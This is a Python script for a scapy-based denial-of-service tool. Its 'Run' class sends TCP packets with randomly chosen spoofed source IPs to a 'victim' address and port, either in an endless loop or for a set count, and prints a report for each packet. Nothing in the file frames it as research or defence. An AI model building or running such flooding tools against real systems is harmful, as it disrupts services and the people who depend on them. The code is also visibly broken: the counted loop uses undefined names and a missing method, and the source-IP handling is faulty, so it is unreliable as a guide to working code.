class Run:
    def __init__(self, source: tuple, victim : tuple, count: int, message: str):
        global send,TCP,IP,random
        from scapy.all import sendp as send, TCP, IP
        from random import choice
        self.source_ips, self.source_port = source
        self.victim_ip, self.victim_port = victim
        self.count,self.message = count, message
        print("Scapy Needs Administrator Permission")
        print("UAC Will Run On Windows")
        print("Press Ctrl + C To Stop The Process")
        if count in ('-1', -1):
            self.infinite_dos()
        else:
            self.counted_dos()

    def build_packet(self, ip, protocol, data):
        self.packet = ip / protocol / data

    def build_ip(self):
        self.ip = IP(src=self.source_ip, dst=self.victim_ip)

    def ready_the_protocol(self):
        self.tcp = TCP(sport=self.source_port, dport=(
            self.victim_port))

    def random_ip(self):
        self.source_ip = int(choice(self.source_ips))

    def report(self):
        print("Send Packet To Target {} from IP {} And Port {} To Port {}".format(
            self.victim_ip, self.source_ip, self.source_port, self.victim_port))

    def infinite_dos(self):
        i = 0
        while True:
            try:
                self.ready_the_protocol()
                self.random_ip()
                self.build_ip()
                self.build_packet(self.ip, self.tcp, self.message)
                send(self.packet)
                self.report()
                i += 1
            except KeyboardInterrupt:
                print("Already Send {} Packets To Target {} from IP {} And Port {} To Port {}".format(
                    i, self.victim_ip, self.source_ip, self.source_port, self.victim_port))
                break

    def counted_dos(self):
        for i in range(0, Count):
            try:
                self.ready_the_protocol()
                self.random_port()
                self.build_packet(ip, tcp, message)
                self.build_ip()
                send(self.packet)
                self.report()
            except KeyboardInterrupt:
                print("Already Send {} Packets To Target {} from IP {} And Port {} To Port {}".format(
                    i, self.victim_ip, self.source_ip, self.source_port, self.victim_port))
                break
        print("Operation Was Successful. Sent {} Packets To {}".format(
            self.count, self.victim_ip))
